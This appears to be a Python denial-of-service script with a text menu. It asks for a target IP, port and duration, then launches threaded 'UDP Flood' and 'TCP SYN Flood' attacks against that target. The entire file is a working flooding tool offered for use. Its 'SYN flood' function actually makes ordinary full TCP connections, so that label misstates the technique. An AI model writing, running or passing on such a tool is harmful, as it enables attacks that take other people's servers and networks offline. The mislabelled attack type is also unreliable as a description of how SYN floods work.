import socket
import random
import time
from threading import Thread

def udp_flood(target, port, duration):
    duration = time.time() + duration
    while time.time() < duration:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1024)
        sock.sendto(bytes, (target, port))
        sock.close()

def tcp_syn_flood(target, port, duration):
    duration = time.time() + duration
    while time.time() < duration:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        sock.close()

def menu():
    print("1. UDP Flood")
    print("2. TCP SYN Flood")
    print("3. Quit")
    choice = input("Select attack type:")
    return choice

def main():
    target = input("Enter target IP: ")
    port = int(input("Enter target port: "))
    duration = int(input("Enter attack duration (in seconds): "))
    
    while True:
        choice = menu()
        if choice == '1':
            Thread(target=udp_flood, args=(target, port, duration)).start()
        elif choice == '2':
            Thread(target=tcp_syn_flood, args=(target, port, duration)).start()
        elif choice == '3':
            break
        else:
            print("Invalid choice")

if __name__ == "__main__":
    main()